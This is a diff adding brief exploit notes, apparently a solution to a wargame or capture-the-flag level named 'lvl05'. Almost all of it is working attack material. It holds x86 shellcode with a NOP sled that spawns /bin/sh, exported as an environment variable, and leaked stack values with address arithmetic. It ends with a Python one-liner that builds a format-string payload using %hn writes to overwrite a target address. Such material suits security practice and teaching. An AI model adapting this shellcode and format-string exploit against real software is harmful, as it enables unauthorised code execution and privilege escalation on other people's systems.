@@ -1,0 +1,17 @@
+target address: 0x80497e0 ('e0970408'.decode('hex'))
+export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
+
+bbbb 64 f7fcfac0 f7ec3add ffffd28f ffffd28e 0 ffffffff ffffd314 f7fdb000 62626262
+
+SHELLCODE: 0xffffd4a8
+ffff = 65535
+d4a8 = 54440
+
+
+
+
+
+
+
+
+python -c "print('e0970408'.decode('hex') + 'ffffffff'.decode('hex') + 'e2970408'.decode('hex') + '%08x' * 8 + '%054374x' + '%hn' + '%011085x' + '%hn')" > /var/crash/lvl05
